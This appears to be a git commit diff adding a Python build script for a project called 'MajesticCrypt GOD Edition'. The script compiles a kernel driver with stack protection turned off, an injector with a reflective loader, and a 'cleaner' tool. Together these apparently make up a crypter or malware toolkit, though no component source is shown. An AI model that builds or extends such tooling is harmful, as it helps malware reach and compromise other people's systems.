8f7ac499635a2aad5c56ad81b4e2adca72a84033
avar27774-ship-it <avar27774@gmail.com>
2026-04-05 21:21:50 +0500

    Update build.py

--- tools/build.py
+++ tools/build.py
@@ -1,1 +1,15 @@
+import os
+import subprocess
 
+print("[*] Building MajesticCrypt GOD Edition...")
+
+# Build driver
+os.system("cl /nologo /O2 /GS- /kernel ../src/kernel/driver_main.c /link /driver /out:../build/majestic_driver.sys")
+
+# Build injector
+os.system("g++ -O2 -static ../src/injector/main.cpp ../src/injector/reflective_loader.c -o ../build/Majestic_Injector.exe")
+
+# Build cleaner
+os.system("gcc -O2 -static ../src/cleaner/cleaner_ultimate.c -o ../build/cleaner_ultimate.exe")
+
+print("[+] Build complete!")
